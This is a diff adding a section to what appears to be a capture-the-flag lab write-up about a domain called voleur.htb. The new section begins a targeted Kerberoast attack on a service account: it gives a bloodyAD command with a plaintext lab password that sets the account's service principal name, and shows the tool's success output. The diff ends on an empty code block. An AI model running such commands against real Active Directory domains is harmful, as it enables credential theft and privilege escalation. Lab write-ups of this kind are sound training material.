@@ -257,3 +257,14 @@ Both of these users have the same access on SMB
 ![](Pasted%20image%2020260406132102.png)
 As seen here i have WriteSPN on `svc_winrm` and also GenericWrite on `lacey.miller` and the `second-line technicians` OU
 
+# Targeted Kerberoast on `svc_winrm`
+```python
+faketime -f +8h bloodyAD -k --host dc.voleur.htb -d voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' set object 'svc_winrm' servicePrincipalName -v 'service/hacked'
+
+[+] svc_winrm's servicePrincipalName has been updated
+```
+First ill update the SPN
+
+```python
+
+```
